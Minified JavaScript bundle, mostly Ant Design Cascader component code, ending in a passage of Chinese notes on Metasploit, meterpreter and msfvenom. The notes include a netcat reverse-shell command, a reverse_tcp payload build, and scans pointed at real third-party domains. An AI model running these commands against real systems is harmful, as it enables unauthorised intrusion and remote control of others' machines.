")},f=function(A,W,k,z,Q,Z){var uu=Q.filter,nu=uu===void 0?o:uu,iu=Q.render,cu=iu===void 0?i:iu,Bu=Q.limit,Au=Bu===void 0?50:Bu,yu=Q.sort;return e.useMemo(function(){var G=[];if(!A)return[];function K(N,X){N.forEach(function(ou){if(!(!yu&&Au>0&&G.length>=Au)){var Cu=[].concat(Object(r.a)(X),[ou]),lu=ou[k.children];if((!lu||lu.length===0||Z)&&nu(A,Cu,{label:k.label})){var vu;G.push(Object(h.a)(Object(h.a)({},ou),{},(vu={},Object(t.a)(vu,k.label,cu(A,Cu,z,k)),Object(t.a)(vu,s,Cu),vu)))}lu&&K(ou[k.children],Cu)}})}return K(W,[]),yu&&G.sort(function(N,X){return yu(N[s],X[s],A,k)}),Au>0?G.slice(0,Au):G},[A,W,k,z,cu,Z,nu,yu,Au])};function P(A){var W=A.prefixCls,k=A.multiple,z=A.options,Q=A.activeValue,Z=A.prevValuePath,uu=A.onToggleOpen,nu=A.onSelect,iu=A.onActive,cu=A.checkedSet,Bu=A.halfCheckedSet,Au=A.loadingKeys,yu=A.isSelectable,G="".concat(W,"-menu"),K="".concat(W,"-menu-item"),N=e.useContext(a),X=N.fieldNames,ou=N.changeOnSelect,Cu=N.expandTrigger,lu=N.expandIcon,vu=N.loadingIcon,Iu=N.dropdownMenuColumnStyle,Du=Cu==="hover",du=e.useMemo(function(){return z.map(function($){var fu=$.disabled,pu=$[s],Tu=$[X.label],Mu=$[X.value],ju=j($,X),Ju=pu?pu.map(function(bu){return bu[X.value]}):[].concat(Object(r.a)(Z),[Mu]),te=O(Ju),Lu=Au.includes(te),zu=cu.has(te),ie=Bu.has(te);return{disabled:fu,label:Tu,value:Mu,isLeaf:ju,isLoading:Lu,checked:zu,halfChecked:ie,option:$,fullPath:Ju,fullPathKey:te}})},[z,cu,X,Bu,Au,Z]);return e.createElement("ul",{className:G,role:"menu"},du.map(function($){var fu,pu=$.disabled,Tu=$.label,Mu=$.value,ju=$.isLeaf,Ju=$.isLoading,te=$.checked,Lu=$.halfChecked,zu=$.option,ie=$.fullPath,bu=$.fullPathKey,_u=function(){!pu&&(!Du||!ju)&&iu(ie)},Vu=function(){yu(zu)&&nu(ie,ju)},ae;return typeof zu.title=="string"?ae=zu.title:typeof Tu=="string"&&(ae=Tu),e.createElement("li",{key:bu,className:m()(K,(fu={},Object(t.a)(fu,"".concat(K,"-expand"),!ju),Object(t.a)(fu,"".concat(K,"-active"),Q===Mu),Object(t.a)(fu,"".concat(K,"-disabled"),pu),Object(t.a)(fu,"".concat(K,"-loading"),Ju),fu)),style:Iu,role:"menuitemcheckbox",title:ae,"aria-checked":te,"data-path-key":bu,onClick:function(){_u(),(!k||ju)&&Vu()},onDoubleClick:function(){ou&&uu(!1)},onMouseEnter:function(){Du&&_u()},onMouseDown:function(ce){ce.preventDefault()}},k&&e.createElement(R,{prefixCls:"".concat(W,"-checkbox"),checked:te,halfChecked:Lu,disabled:pu,onClick:function(ce){ce.stopPropagation(),Vu()}}),e.createElement("div",{className:"".concat(K,"-content")},Tu),!Ju&&lu&&!ju&&e.createElement("div",{className:"".concat(K,"-expand-icon")},lu),Ju&&vu&&e.createElement("div",{className:"".concat(K,"-loading-icon")},vu))}))}var D=function(){var A=Object(c.e)(),W=A.multiple,k=A.open,z=e.useContext(a),Q=z.values,Z=e.useState([]),uu=Object(E.a)(Z,2),nu=uu[0],iu=uu[1];return e.useEffect(function(){if(k&&!W){var cu=Q[0];iu(cu||[])}},[k]),[nu,iu]},C=n("4IlW"),M=function(A,W,k,z,Q,Z){var uu=Object(c.e)(),nu=uu.direction,iu=uu.searchValue,cu=uu.toggleOpen,Bu=uu.open,Au=nu==="rtl",yu=e.useMemo(function(){for(var Iu=-1,Du=W,du=[],$=[],fu=z.length,pu=function(Lu){var zu=Du.findIndex(function(ie){return ie[k.value]===z[Lu]});if(zu===-1)return"break";Iu=zu,du.push(Iu),$.push(z[Lu]),Du=Du[Iu][k.children]},Tu=0;Tu<fu;Tu+=1){var Mu=pu(Tu);if(Mu==="break")break}for(var ju=W,Ju=0;Ju<du.length-1;Ju+=1)ju=ju[du[Ju]][k.children];return[$,Iu,ju]},[z,k,W]),G=Object(E.a)(yu,3),K=G[0],N=G[1],X=G[2],ou=function(Du){Q(Du)},Cu=function(Du){var du=X.length,$=N;$===-1&&Du<0&&($=du);for(var fu=0;fu<du;fu+=1){$=($+Du+du)%du;var pu=X[$];if(pu&&!pu.disabled){var Tu=pu[k.value],Mu=K.slice(0,-1).concat(Tu);ou(Mu);return}}},lu=function(){if(K.length>1){var Du=K.slice(0,-1);ou(Du)}else cu(!1)},vu=function(){var Du,du=((Du=X[N])===null||Du===void 0?void 0:Du[k.children])||[],$=du.find(function(pu){return!pu.disabled});if($){var fu=[].concat(Object(r.a)(K),[$[k.value]]);ou(fu)}};e.useImperativeHandle(A,function(){return{onKeyDown:function(Du){var du=Du.which;switch(du){case C.a.UP:case C.a.DOWN:{var $=0;du===C.a.UP?$=-1:du===C.a.DOWN&&($=1),$!==0&&Cu($);break}case C.a.LEFT:{Au?vu():lu();break}case C.a.RIGHT:{Au?lu():vu();break}case C.a.BACKSPACE:{iu||lu();break}case C.a.ENTER:{K.length&&Z(K,X[N]);break}case C.a.ESC:cu(!1),Bu&&Du.stopPropagation()}},onKeyUp:function(){}}})},L=e.forwardRef(function(A,W){var k,z,Q,Z,uu=Object(c.e)(),nu=uu.prefixCls,iu=uu.multiple,cu=uu.searchValue,Bu=uu.toggleOpen,Au=uu.notFoundContent,yu=uu.direction,G=e.useRef(),K=yu==="rtl",N=e.useContext(a),X=N.options,ou=N.values,Cu=N.halfValues,lu=N.fieldNames,vu=N.changeOnSelect,Iu=N.onSelect,Du=N.searchOptions,du=N.dropdownPrefixCls,$=N.loadData,fu=N.expandTrigger,pu=du||nu,Tu=e.useState([]),Mu=Object(E.a)(Tu,2),ju=Mu[0],Ju=Mu[1],te=function(Ou){if(!(!$||cu)){var Gu=T(Ou,X,lu),Ku=Gu.map(function(he){var de=he.option;return de}),Ce=Ku[Ku.length-1];if(Ce&&!j(Ce,lu)){var Ae=O(Ou);Ju(function(he){return[].concat(Object(r.a)(he),[Ae])}),$(Ku)}}};e.useEffect(function(){ju.length&&ju.forEach(function(Nu){var Ou=b(Nu),Gu=T(Ou,X,lu,!0).map(function(Ce){var Ae=Ce.option;return Ae}),Ku=Gu[Gu.length-1];(!Ku||Ku[lu.children]||j(Ku,lu))&&Ju(function(Ce){return Ce.filter(function(Ae){return Ae!==Nu})})})},[X,ju,lu]);var Lu=e.useMemo(function(){return new Set(_(ou))},[ou]),zu=e.useMemo(function(){return new Set(_(Cu))},[Cu]),ie=D(),bu=Object(E.a)(ie,2),_u=bu[0],Vu=bu[1],ae=function(Ou){Vu(Ou),te(Ou)},ue=function(Ou){var Gu=Ou.disabled,Ku=j(Ou,lu);return!Gu&&(Ku||vu||iu)},ce=function(Ou,Gu){var Ku=arguments.length>2&&arguments[2]!==void 0?arguments[2]:!1;Iu(Ou),!iu&&(Gu||vu&&(fu==="hover"||Ku))&&Bu(!1)},Ru=e.useMemo(function(){return cu?Du:X},[cu,Du,X]),xu=e.useMemo(function(){for(var Nu=[{options:Ru}],Ou=Ru,Gu=function(he){var de=_u[he],pe=Ou.find(function(je){return je[lu.value]===de}),Be=pe==null?void 0:pe[lu.children];if(!(Be==null?void 0:Be.length))return"break";Ou=Be,Nu.push({options:Be})},Ku=0;Ku<_u.length;Ku+=1){var Ce=Gu(Ku);if(Ce==="break")break}return Nu},[Ru,_u,lu]),Zu=function(Ou,Gu){ue(Gu)&&ce(Ou,j(Gu,lu),!0)};M(W,Ru,lu,_u,ae,Zu),e.useEffect(function(){for(var Nu=0;Nu<_u.length;Nu+=1){var Ou,Gu=_u.slice(0,Nu+1),Ku=O(Gu),Ce=(Ou=G.current)===null||Ou===void 0?void 0:Ou.querySelector('li[data-path-key="'.concat(Ku.replace(/\\{0,2}"/g,'\\"'),'"]'));Ce&&v(Ce)}},[_u]);var ku=!((k=xu[0])===null||k===void 0||(z=k.options)===null||z===void 0?void 0:z.length),ee=[(Q={},Object(t.a)(Q,lu.label,Au),Object(t.a)(Q,lu.value,"__EMPTY__"),Object(t.a)(Q,"disabled",!0),Q)],me=Object(h.a)(Object(h.a)({},A),{},{multiple:!ku&&iu,onSelect:ce,onActive:ae,onToggleOpen:Bu,checkedSet:Lu,halfCheckedSet:zu,loadingKeys:ju,isSelectable:ue}),ge=ku?[{options:ee}]:xu,fe=ge.map(function(Nu,Ou){var Gu=_u.slice(0,Ou),Ku=_u[Ou];return e.createElement(P,Object(S.a)({key:Ou},me,{prefixCls:pu,options:Nu.options,prevValuePath:Gu,activeValue:Ku}))});return e.createElement("div",{className:m()("".concat(pu,"-menus"),(Z={},Object(t.a)(Z,"".concat(pu,"-menu-empty"),ku),Object(t.a)(Z,"".concat(pu,"-rtl"),K),Z)),ref:G},fe)}),J=L,q=function(A,W,k,z,Q){return e.useMemo(function(){var Z=Q||function(uu){var nu=z?uu.slice(-1):uu,iu=" / ";return nu.every(function(cu){return["string","number"].includes(Object(l.a)(cu))})?nu.join(iu):nu.reduce(function(cu,Bu,Au){var yu=e.isValidElement(Bu)?e.cloneElement(Bu,{key:Au}):Bu;return Au===0?[yu]:[].concat(Object(r.a)(cu),[iu,yu])},[])};return A.map(function(uu){var nu=T(uu,W,k),iu=Z(nu.map(function(cu){var Bu,Au=cu.option,yu=cu.value;return(Bu=Au==null?void 0:Au[k.label])!==null&&Bu!==void 0?Bu:yu}),nu.map(function(cu){var Bu=cu.option;return Bu}));return{label:iu,value:O(uu),valueCells:uu}})},[A,W,k,Q,z])};function V(A){var W=e.useRef();W.current=A;var k=e.useCallback(function(){return W.current.apply(W,arguments)},[]);return k}var tu=n("815F"),Y=function(A,W){var k=e.useRef({options:null,info:null}),z=e.useCallback(function(){return k.current.options!==A&&(k.current.options=A,k.current.info=Object(tu.a)(A,{fieldNames:W,initWrapper:function(Z){return Object(h.a)(Object(h.a)({},Z),{},{pathKeyEntities:{}})},processEntity:function(Z,uu){var nu=Z.nodes.map(function(iu){return iu[W.value]}).join(B);uu.pathKeyEntities[nu]=Z,Z.key=nu}})),k.current.info.pathKeyEntities},[W,A]);return z},au=n("Kwbf");function hu(A){return e.useMemo(function(){if(!A)return[!1,{}];var W={matchInputWidth:!0,limit:50};return A&&Object(l.a)(A)==="object"&&(W=Object(h.a)(Object(h.a)({},W),A)),W.limit<=0&&delete W.limit,[!0,W]},[A])}var mu=function(A,W){return e.useCallback(function(k){var z=[],Q=[];return k.forEach(function(Z){var uu=T(Z,A,W);uu.every(function(nu){return nu.option})?Q.push(Z):z.push(Z)}),[Q,z]},[A,W])},Pu=["id","prefixCls","fieldNames","defaultValue","value","changeOnSelect","onChange","displayRender","checkable","searchValue","onSearch","showSearch","expandTrigger","options","dropdownPrefixCls","loadData","popupVisible","open","popupClassName","dropdownClassName","dropdownMenuColumnStyle","popupPlacement","placement","onDropdownVisibleChange","onPopupVisibleChange","expandIcon","loadingIcon","children","dropdownMatchSelectWidth"];function qu(A){return Array.isArray(A)&&Array.isArray(A[0])}function Qu(A){return A?qu(A)?A:A.length===0?[]:[A]:[]}var Wu=e.forwardRef(function(A,W){var k=A.id,z=A.prefixCls,Q=z===void 0?"rc-cascader":z,Z=A.fieldNames,uu=A.defaultValue,nu=A.value,iu=A.changeOnSelect,cu=A.onChange,Bu=A.displayRender,Au=A.checkable,yu=A.searchValue,G=A.onSearch,K=A.showSearch,N=A.expandTrigger,X=A.options,ou=A.dropdownPrefixCls,Cu=A.loadData,lu=A.popupVisible,vu=A.open,Iu=A.popupClassName,Du=A.dropdownClassName,du=A.dropdownMenuColumnStyle,$=A.popupPlacement,fu=A.placement,pu=A.onDropdownVisibleChange,Tu=A.onPopupVisibleChange,Mu=A.expandIcon,ju=Mu===void 0?">":Mu,Ju=A.loadingIcon,te=A.children,Lu=A.dropdownMatchSelectWidth,zu=Lu===void 0?!1:Lu,ie=Object(F.a)(A,Pu),bu=Object(p.a)(k),_u=!!Au,Vu=Object(g.a)(uu,{value:nu,postState:Qu}),ae=Object(E.a)(Vu,2),ue=ae[0],ce=ae[1],Ru=e.useMemo(function(){return y(Z)},[JSON.stringify(Z)]),xu=e.useMemo(function(){return X||[]},[X]),Zu=Y(xu,Ru),ku=e.useCallback(function(Fe){var wu=Zu();return Fe.map(function(le){var De=wu[le].nodes;return De.map(function(_e){return _e[Ru.value]})})},[Zu,Ru]),ee=Object(g.a)("",{value:yu,postState:function(wu){return wu||""}}),me=Object(E.a)(ee,2),ge=me[0],fe=me[1],Nu=function(wu,le){fe(wu),le.source!=="blur"&&G&&G(wu)},Ou=hu(K),Gu=Object(E.a)(Ou,2),Ku=Gu[0],Ce=Gu[1],Ae=f(ge,xu,Ru,ou||Q,Ce,iu),he=mu(xu,Ru),de=e.useMemo(function(){var Fe=he(ue),wu=Object(E.a)(Fe,2),le=wu[0],De=wu[1];if(!_u||!ue.length)return[le,[],De];var _e=_(le),ye=Zu(),ve=Object(I.a)(_e,!0,ye),Pe=ve.checkedKeys,Se=ve.halfCheckedKeys;return[ku(Pe),ku(Se),De]},[_u,ue,Zu,ku,he]),pe=Object(E.a)(de,3),Be=pe[0],je=pe[1],Oe=pe[2],We=e.useMemo(function(){var Fe=_(Be),wu=x(Fe,Zu);return[].concat(Object(r.a)(Oe),Object(r.a)(ku(wu)))},[Be,Zu,ku,Oe]),Ge=q(We,xu,Ru,_u,Bu),we=V(function(Fe){if(ce(Fe),cu){var wu=Qu(Fe),le=wu.map(function(ye){return T(ye,xu,Ru).map(function(ve){return ve.option})}),De=_u?wu:wu[0],_e=_u?le:le[0];cu(De,_e)}}),Te=V(function(Fe){if(fe(""),!_u)we(Fe);else{var wu=O(Fe),le=_(Be),De=_(je),_e=le.includes(wu),ye=Oe.some(function(be){return O(be)===wu}),ve=Be,Pe=Oe;if(ye&&!_e)Pe=Oe.filter(function(be){return O(be)!==wu});else{var Se=_e?le.filter(function(be){return be!==wu}):[].concat(Object(r.a)(le),[wu]),Me=Zu(),xe;if(_e){var ke=Object(I.a)(Se,{checked:!1,halfCheckedKeys:De},Me);xe=ke.checkedKeys}else{var Re=Object(I.a)(Se,!0,Me);xe=Re.checkedKeys}var Ne=x(xe,Zu);ve=ku(Ne)}we([].concat(Object(r.a)(Pe),Object(r.a)(ve)))}}),Xe=function(wu,le){if(le.type==="clear"){we([]);return}var De=le.values[0].valueCells;Te(De)},He=vu!==void 0?vu:lu,Ue=Du||Iu,Ie=fu||$,Qe=function(wu){pu==null||pu(wu),Tu==null||Tu(wu)},Ke=e.useMemo(function(){return{options:xu,fieldNames:Ru,values:Be,halfValues:je,changeOnSelect:iu,onSelect:Te,checkable:Au,searchOptions:Ae,dropdownPrefixCls:ou,loadData:Cu,expandTrigger:N,expandIcon:ju,loadingIcon:Ju,dropdownMenuColumnStyle:du}},[xu,Ru,Be,je,iu,Te,Au,Ae,ou,Cu,N,ju,Ju,du]),Le=!(ge?Ae:xu).length,Ye=ge&&Ce.matchInputWidth||Le?{}:{minWidth:"auto"};return e.createElement(a.Provider,{value:Ke},e.createElement(c.a,Object(S.a)({},ie,{ref:W,id:bu,prefixCls:Q,dropdownMatchSelectWidth:zu,dropdownStyle:Ye,displayValues:Ge,onDisplayValuesChange:Xe,mode:_u?"multiple":void 0,searchValue:ge,onSearch:Nu,showSearch:Ku,OptionList:J,emptyOptions:Le,open:He,dropdownClassName:Ue,placement:Ie,onDropdownVisibleChange:Qe,getRawInputElement:function(){return te}})))}),U=Wu,Fu=U,ru=n("bT9E"),Eu=n("UESt"),eu=n("ye1Q"),su=n("5bA4"),gu=n("H84U"),Yu=n("3Nzz"),Ee=n("1vzs"),Hu=n("EXcs"),Su=function(A,W){var k={};for(var z in A)Object.prototype.hasOwnProperty.call(A,z)&&W.indexOf(z)<0&&(k[z]=A[z]);if(A!=null&&typeof Object.getOwnPropertySymbols=="function")for(var Q=0,z=Object.getOwnPropertySymbols(A);Q<z.length;Q++)W.indexOf(z[Q])<0&&Object.prototype.propertyIsEnumerable.call(A,z[Q])&&(k[z[Q]]=A[z[Q]]);return k};function oe(A,W,k){var z=A.toLowerCase().split(W).reduce(function(uu,nu,iu){return iu===0?[nu]:[].concat(Object(r.a)(uu),[W,nu])},[]),Q=[],Z=0;return z.forEach(function(uu,nu){var iu=Z+uu.length,cu=A.slice(Z,iu);Z=iu,nu%2==1&&(cu=e.createElement("span",{className:"".concat(k,"-menu-item-keyword"),key:"seperator-".concat(nu)},cu)),Q.push(cu)}),Q}var re=function(W,k,z,Q){var Z=[],uu=W.toLowerCase();return k.forEach(function(nu,iu){iu!==0&&Z.push(" / ");var cu=nu[Q.label],Bu=Object(l.a)(cu);(Bu==="string"||Bu==="number")&&(cu=oe(String(cu),uu,z)),Z.push(cu)}),Z},se=e.forwardRef(function(A,W){var k,z=A.prefixCls,Q=A.size,Z=A.className,uu=A.multiple,nu=A.bordered,iu=nu===void 0?!0:nu,cu=A.transitionName,Bu=A.choiceTransitionName,Au=Bu===void 0?"":Bu,yu=A.popupClassName,G=A.dropdownClassName,K=A.expandIcon,N=A.showSearch,X=A.allowClear,ou=X===void 0?!0:X,Cu=A.notFoundContent,lu=A.direction,vu=A.getPopupContainer,Iu=Su(A,["prefixCls","size","className","multiple","bordered","transitionName","choiceTransitionName","popupClassName","dropdownClassName","expandIcon","showSearch","allowClear","notFoundContent","direction","getPopupContainer"]),Du=Object(ru.a)(Iu,["suffixIcon"]),du=e.useContext(gu.b),$=du.getPopupContainer,fu=du.getPrefixCls,pu=du.renderEmpty,Tu=du.direction,Mu=lu||Tu,ju=Mu==="rtl",Ju=Cu||pu("Cascader"),te=fu(),Lu=fu("select",z),zu=fu("cascader",z),ie=m()(G||yu,"".concat(zu,"-dropdown"),Object(t.a)({},"".concat(zu,"-dropdown-rtl"),Mu==="rtl")),bu=e.useMemo(function(){if(!N)return N;var ee={render:re};return Object(l.a)(N)==="object"&&(ee=Object(S.a)(Object(S.a)({},ee),N)),ee},[N]),_u=e.useContext(Yu.b),Vu=Q||_u,ae=K;K||(ae=ju?e.createElement(su.a,null):e.createElement(Eu.a,null));var ue=e.createElement("span",{className:"".concat(Lu,"-menu-item-loading-icon")},e.createElement(eu.a,{spin:!0})),ce=e.useMemo(function(){return uu?e.createElement("span",{className:"".concat(zu,"-checkbox-inner")}):!1},[uu]),Ru=Object(Ee.a)(Object(S.a)(Object(S.a)({},A),{multiple:uu,prefixCls:Lu})),xu=Ru.suffixIcon,Zu=Ru.removeIcon,ku=Ru.clearIcon;return e.createElement(Fu,Object(S.a)({prefixCls:Lu,className:m()(!z&&zu,(k={},Object(t.a)(k,"".concat(Lu,"-lg"),Vu==="large"),Object(t.a)(k,"".concat(Lu,"-sm"),Vu==="small"),Object(t.a)(k,"".concat(Lu,"-rtl"),ju),Object(t.a)(k,"".concat(Lu,"-borderless"),!iu),k),Z)},Du,{direction:Mu,notFoundContent:Ju,allowClear:ou,showSearch:bu,expandIcon:ae,inputIcon:xu,removeIcon:Zu,clearIcon:ku,loadingIcon:ue,checkable:ce,dropdownClassName:ie,dropdownPrefixCls:z||zu,choiceTransitionName:Object(Hu.b)(te,"",Au),transitionName:Object(Hu.b)(te,"slide-up",cu),getPopupContainer:vu||$,ref:W}))});se.displayName="Cascader";var Uu=d.a=se},EkZe:function(H,d,n){"use strict";n.d(d,"a",function(){return r});var S=n("q1tI"),t=n.n(S),l=n("jJ7j"),r={name:"\u3010MetaSploit\u3011 / \u3010MsfConsole\u3011 / \u3010msf\u3011     (\u57FA\u4E8E\u3010ExploitDB\u3011)",desc:t.a.createElement(t.a.Fragment,null,"\uFF08\u53D1\u73B0\u76EE\u6807\u57DF\u540D\u5185\uFF0C\u5177\u6709\u7269\u7406MAC\u5730\u5740\u7684\uFF0C\u542F\u7528\u4E86IPv6\u7684\u8BA1\u7B97\u673A\uFF09"),steps:[{name:"\u57FA\u672C\u4F7F\u7528",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,l.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              metasploit / msfconsole / msf \uFF08\u53D1\u73B0\u76EE\u6807\u57DF\u540D\u5185\uFF0C\u5177\u6709\u7269\u7406MAC\u5730\u5740\u7684\uFF0C\u542F\u7528\u4E86IPv6\u7684\u8BA1\u7B97\u673A\uFF09

              \u8FDB\u884C\u66F4\u65B0
                  msfupdate

              \u3010msfconsole\u3011\u8F6F\u4EF6
                  \u8FDB\u5165\u754C\u9762\u3002
                      \u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0C\u4EE5\u3010msf6 >\u3011\u5F00\u5934\u3002
                      \u3010back\u3011\uFF0C\u56DE\u5230\u4E0A\u4E00\u7EA7\u3010\u83DC\u5355\u3011\u3002
                  \u6A21\u5757\uFF1A
                      \u3010search <\u5173\u952E\u5B57>\u3011\uFF0C\u67E5\u627E\u6A21\u5757
                          1.\u5148\u67E5\u627E\u3010\u670D\u52A1\u540D\u3011
                              1.\u5982\u3010Samba\u3011
                          2.\u7136\u540E\u518D\u67E5\u627E\u3010\u5177\u4F53\u7248\u672C\u3011
                              1.\u5982\u30103.0.20\u3011
                          3.\u5982\u679C\u8FD8\u627E\u4E0D\u5230\uFF0C\u5219\u53EF\u4EE5Google\u641C\u7D22
                              1.\u5982\u3010samba 3.0.20 exploit\u3011\uFF0C\u540E\u9762\u5E26 exploit \u4EE3\u8868\u9ED1\u5BA2\u653B\u51FB\u3002
                                  1.\u4E5F\u53EF\u4EE5\u4F7F\u7528\u3010Vulnerability\u3011\u4E3A\u5173\u952E\u5B57
                          4.\u6709\u4E2A\u975E\u5E38\u5B9E\u7528\u7684\uFF0Cexploit\u6F0F\u6D1E\u5229\u7528\uFF0C\u6536\u5F55\u7F51\u7AD9
                              CVE security vulnerability database.        https://www.cvedetails.com/
                                  1.\u3010\u641C\u7D22\u670D\u52A1\u3011\u2014\u2014\u3010\u9009\u62E9Products\u3011\u2014\u2014\u3010\u9009\u62E9Browse all versions\u3011\u2014\u2014\u3010\u67E5\u770B\u5BF9\u5E94\u7248\u672C \u7684\u6240\u6709Vulnerability\u3011
                                  2.\u67E5\u770B\u662F\u5426\u6709\u53EF\u7528 msf \u811A\u672C\uFF1A
                                      1.\u5728\u3010Metasploit Modules Related To\u3011\u4E00\u680F\uFF0C\u5DF2\u7ECF\u5168\u90E8\u5217\u51FA\u4E86\u3002

                      \u3010use auxiliary/scanner/discovery/ipv6_multicast_ping\u3011\uFF0C\u9009\u62E9\u6A21\u5757

                      \u3010show options\u3011 \u67E5\u770B\u9009\u9879

                  set \u8BBE\u7F6E\u3010\u5168\u5C40\u53C2\u6570\u3011
                      1.\u548C\u3010\u6A21\u5757\u53C2\u6570\u3011\u7684\u65B9\u6CD5\u7C7B\u4F3C\uFF1B\u53EA\u662F\u4F5C\u7528\u4E8E \u6240\u6709\u6A21\u5757 \u3002
                      2.\u5E38\u7528\u9879
                          1.\u3010RHOSTS\u3011\uFF0C\u8FDC\u7A0B\u673AIP
                          2.\u3010LHOST\u3011\uFF0C\u672C\u5730\u673AIP
                          3.\u3010LPORT\u3011\uFF0C\u672C\u5730\u673A\u7AEF\u53E3

                  set \u8BBE\u7F6E\u3010\u6A21\u5757\u53C2\u6570\u3011
                      \u5FC5\u9009\u53C2\u6570\uFF1Arhosts\uFF0C\u53EF\u4EE5\u9009\u62E9 IP\u3001\u57DF\u540D
                          \u3010192.168.2.103\u3011\u3001\u3010192.168.81.1\u3011\u3001\u3010192.168.219.129\u3011
                          \u3010zhihu.com\u3011\u3001\u3010www.boe.ttct.edu.tw\u3011
                      \u53EF\u9009\u53C2\u6570\uFF1Ainterface\uFF0C\u6307\u5B9A\u7279\u5B9A\u7684\u3010\u7F51\u7EDC\u8BBE\u5907\u63A5\u53E3\u3011\u540D
                          \u3010\u81EA\u5DF1\u8BBE\u7F6E\u7684Wifi\u3011\u3001\u3010eth0\u3011\u3001\u3010lo\u3011

                  \u9009\u62E9payload
                      \u3010show payloads\u3011\uFF0C\u67E5\u770B\u53EF\u7528\u7684payload
                      \u3010set payload <\u540D\u79F0>\u3011\uFF0C\u4F7F\u7528\u67D0\u4E2Apayload
                          1.\u5FC5\u987B\u6CE8\u610F\uFF1A\u6709\u4E9B\u3010payload\u3011\u9700\u8981\u8BBE\u7F6E\u53C2\u6570\u3002
                              1.\u540C\u6837\u662F\u7528\u3010set \u8BBE\u7F6E\u53C2\u6570\u3011\u3002

                  run \u8FD0\u884C\u811A\u672C

              \u5E38\u89C1\u6307\u4EE4\uFF1A

                  check
                      \u63A2\u6D4B\u3010\u5F53\u524D\u811A\u672C\u3011\u5BF9\u5E94\u7684\u6F0F\u6D1E\uFF0C\u662F\u5426\u5728\u3010\u76EE\u6807\u673A\u5668\u3011\u4E0A\u5B58\u5728

              \u5E38\u89C1\u5B50\u6A21\u5757\uFF1A

                  \u3010multi/script/web_delivery\u3011
                      \u7528\u4E8E\u4E00\u4E9B \u3010Web\u4FE1\u606F\u3011 \u63A2\u6D4B\u3002


              `))},{name:"\u3010meterpreter\u3011\u7EC8\u7AEF",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,l.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u53C2\u8003\u8D44\u6599\uFF1A
                  https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

              meterpreter\u7EC8\u7AEF\uFF1A
                  1.\u9ED8\u8BA4\u60C5\u51B5\u4E0B\uFF0C\u4EE5\u3010meterpreter >\u3011\u5F00\u5934\u3002
                  2.\u5E38\u89C1\u6307\u4EE4\uFF1A
                      1.\u4ECE\u3010\u666E\u901Ashell\u3011\uFF0C\u8F6C\u6362\u4E3A\u3010meterpreter\u7EC8\u7AEF\u3011
                          1.\u89C1\u3010\u6211\u7684\u7B14\u8BB0\u3011
                      2.\u4ECE\u3010meterpreter\u7EC8\u7AEF\u3011\uFF0C\u8F6C\u6362\u4E3A\u3010\u666E\u901Ashell\u3011
                          1.\u6267\u884C\u3010shell\u3011\u547D\u4EE4\u3002
                      3.\u3010execute\u3011\uFF0C\u6267\u884C\u6587\u4EF6
                          1.\u3010execute -f nc.exe -a "-e cmd.exe 10.10.14.20 1234"\u3011
                              \u3010-f\u3011\uFF0C\u6307\u5B9A\u6587\u4EF6
                              \u3010-a\u3011\uFF0C\u4F20\u5165arguments
                      4.\u3010sysinfo\u3011\uFF0C\u67E5\u770B\u76EE\u6807\u7CFB\u7EDF\u7684\u57FA\u672C\u4FE1\u606F\u3001\u7248\u672C\u53F7\u3002
                      5.\u4E0A\u4F20\u4E0B\u8F7D\uFF1A
                          1.\u3010download <\u76EE\u6807\u6587\u4EF6> <\u672C\u5730\u76F8\u5BF9\u5B58\u653E\u8DEF\u5F84>\u3011
                              1.\u6B64\u5904\uFF0C\u5EFA\u8BAE\u5148\u3010lcd\u3011\u79FB\u52A8\u4E4B\u540E\uFF0C\u518D\u8FDB\u884C\u4E0B\u8F7D\u3002\u56E0\u4E3A\u3010meterpreter\u7EC8\u7AEF\u3011\u4E00\u822C\u65E0\u6CD5\u6B63\u786E\u8BC6\u522B\u3010~\u3011\u5B57\u7B26\u3002
                          2.\u3010upload <\u76EE\u6807\u6587\u4EF6> <\u8FDC\u7A0B\u8FDC\u7A0B\u8DEF\u5F84>\u3011
                      6.\u64CD\u4F5C\u672C\u5730\u653B\u51FB\u673A\u5668\uFF1A
                          1.\u3010lcd\u3011\uFF0C\u672C\u5730\u7684cd
                          2.\u3010lls\u3011\uFF0C\u672C\u5730\u7684ls

              \u6210\u529F\u4F8B\u5B50\uFF1A
                  \u53C2\u6570\u4EC5\u3010www.boe.ttct.edu.tw\u3011\u57DF\u540D\uFF0C\u8FDB\u884C\u7684\u68C0\u67E5\u3002\uFF08\u67E5\u51FA\u4E86\u30102001:288:9200::10\u3011 \uFF09



                `,`

                \u5E38\u89C1\u547D\u4EE4\uFF1A
                    search  -f  <\u6587\u4EF6\u540D\u79F0>
                        \u6709\u65F6\u5019\uFF0C\u53EF\u4EE5\u5FEB\u901F\u627E\u5230\uFF0C\u67D0\u4E00\u540D\u79F0\u6587\u4EF6

                `))},{name:"\u3010msfvenom\u3011    \uFF08 \u524D\u8EAB\u662F\u3010MsfPayload\u3011\u548C\u3010MsfEncode\u3011 \uFF09",desc:t.a.createElement(t.a.Fragment,null),content:t.a.createElement(t.a.Fragment,null,l.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                      \u4ECB\u7ECD\uFF1A
                          \u662F\u4E00\u4E2A\u72EC\u7ACB\u7684\u6709\u6548\u8F7D\u8377\u751F\u6210\u5668\u3002


                      \u4F7F\u7528\uFF1A
                          \u7B2C\u4E00\u79CD\uFF1A
                              msfvenom -p  windows/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f exe > writeup.exe

                          \u7B2C\u4E8C\u79CD\uFF1A
                              \u89C1\u3010Tomcat\u3011\u7684\u3010war\u5305\u4E0A\u4F20\u3011\uFF1F\uFF1F\uFF1F

